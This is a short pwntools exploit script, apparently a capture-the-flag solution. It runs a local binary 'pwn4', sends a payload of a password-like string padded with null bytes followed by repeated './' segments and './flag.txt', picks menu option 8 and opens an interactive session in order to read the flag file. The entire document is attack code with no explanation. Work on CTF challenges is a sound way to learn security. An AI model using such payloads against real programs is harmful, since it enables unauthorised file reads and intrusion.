from pwn import *
p=process("./pwn4")

payload='kaiokenx20'.ljust(0x10,'\x00')+'./'*13+"./flag.txt"
p.sendline(payload)
p.sendlineafter("Enter choice :- ","8")
p.interactive()